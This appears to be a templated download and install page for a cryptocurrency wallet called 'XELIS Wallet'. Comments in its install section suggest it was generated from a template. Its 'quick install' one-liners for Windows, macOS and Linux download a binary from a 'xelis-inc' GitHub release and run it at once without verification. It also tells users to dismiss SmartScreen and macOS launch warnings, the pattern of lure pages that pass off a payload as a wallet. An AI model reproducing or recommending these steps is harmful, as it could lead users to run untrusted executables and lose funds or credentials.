![XELIS Wallet on Linux: unzip, permissions and launch](assets/banner-article.png)
# XELIS Wallet on Linux: unzip, permissions and launch

Extract the archive, set the executable bit and start from a terminal.

## Downloads - Linux

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

Download the Linux archive from the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1) rather than from a mirror. Linux users are the group most likely to receive a re-packed archive from a third-party build script.

> The Linux build is distributed as an archive, not through a distribution repository, so your package manager will not offer it.

The Linux build is a 64-bit archive for Ubuntu 20.04 or later and equivalent distributions. Extract it, mark the wallet binary executable, and run it from a terminal so that any missing library is named in the output instead of failing silently. There is no installer and no system-wide package to add.

<!-- ARTICLE-BODY-BEGIN -->
## What the Linux build assumes

Take an x64 machine with a graphical session and a terminal. The archive's architecture matters: an ARM machine needs an ARM build, and the x64 asset will not run there no matter how it is launched. The supported list, including the requirements the download table does not cover, sits in <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-system-requirements-unsupported-platforms.md">XELIS Wallet supported platforms</a>.

The wallet is delivered as a compressed archive. It does not register itself with apt, dnf or pacman, it does not add a desktop launcher, and it does not touch system directories unless you put it there yourself. That is normal for a self-contained desktop build, and it means updates are downloads you repeat rather than commands you run.

## Extract the archive and start the wallet

1. Download the Linux archive from the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a>.
2. Confirm the file is the one published there before you unpack it.
3. Extract it: `unzip xelis-wallet-desktop-v0.2.1-Linux.zip -d xeliswallet`.
4. Move into the extracted directory and list the contents to find the wallet binary.
5. Make the extracted binary executable: `chmod +x xelis-wallet`.
6. Launch it from the same terminal: `./xelis-wallet`.

Step 2 is not ceremony: an archive re-packed by a third-party install script unpacks exactly like the official one. <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-official-download-check.md">Check the XELIS Wallet release page</a> describes what to compare, and that comparison is what makes the executable bit mean something.

Run the launch from a terminal the first time. A double-click in a file manager often hides the actual error, while the terminal prints the missing library or permission problem in plain text.

## Reading the first error instead of guessing

| What you see | What it usually means | What to do |
| --- | --- | --- |
| `Permission denied` | The executable bit is missing | `chmod +x` the binary, then run it again |
| `cannot execute binary file: Exec format error` | Wrong architecture, for example x64 on ARM | Download the build that matches the machine |
| `error while loading shared libraries` | A runtime library the binary expects is absent | Install the named library with your package manager |
| Nothing appears, no output | A display or session issue rather than the wallet | Run from a terminal and read stderr before retrying |
| Window opens but fonts or icons are wrong | Desktop theme or toolkit mismatch | Launch with a different session to isolate it |

Each of these is a local environment problem with a named cause, which is why the terminal is the fastest route. None of them means the archive is corrupt; a corrupt archive fails at extraction, with an error from `unzip` itself.

## Pointing the wallet at your own node

Linux users often already run services on the same machine, and XELIS Wallet can use one. If you run the XELIS daemon locally, the wallet can talk to that node instead of a public one, which removes a third party from every balance check. The procedure and the trade-off are in <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-run-local-node.md">connect XELIS Wallet to your own node</a>.

Running a local node is optional. The wallet works with the public nodes it is configured to use, and a self-hosted daemon only becomes necessary when you want the connection to stay under your control or when every public endpoint is failing.

## FAQ

### Do I need extra packages to run XELIS Wallet on Linux?

No additional packages are documented. If the binary reports a missing shared library, the message names it, and your distribution's package manager supplies it.

### Can I install it with apt or another package manager?

No. The release ships an archive, so installation means extracting it and running the binary. There is no repository package to install.

### Where should I keep the extracted folder?

Anywhere in your home directory works. Keeping it in one place makes updates predictable, because you replace the folder rather than mixing files from two versions.

### Does it need root?

No. Extracting and running the wallet is a user-level action. Root is only involved if you choose to install it system-wide yourself.

<!-- ARTICLE-BODY-END -->

## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [XELIS Wallet supported platforms](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-system-requirements-unsupported-platforms.md)
- [Check the XELIS Wallet release page](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-official-download-check.md)
- [Connect XELIS Wallet to your own node](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-run-local-node.md)
- [Fix XELIS Wallet not syncing](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-not-syncing-not-connecting-fix.md)
- [Current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1)
